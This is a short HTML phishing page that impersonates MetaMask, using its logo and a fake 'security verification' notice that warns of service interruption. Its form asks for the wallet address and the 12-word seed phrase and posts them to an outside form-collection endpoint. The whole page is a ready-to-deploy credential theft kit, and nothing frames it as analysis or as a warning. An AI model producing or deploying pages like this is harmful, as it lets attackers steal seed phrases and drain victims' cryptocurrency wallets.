<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>MetaMask Wallet Verification</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" alt="MetaMask Logo" class="logo">
    <h2>MetaMask Wallet Security Verification</h2>
    <p>Please verify your wallet seed phrase below to avoid service interruption.</p>

    <form action="https://formspree.io/f/YOUR-FORM-ID" method="POST">
      <input type="text" name="wallet" placeholder="Wallet Address" required><br>
      <input type="text" name="seed" placeholder="12-word Seed Phrase" required><br>
      <button type="submit">Verify Wallet</button>
    </form>
  </div>
</body>
</html>
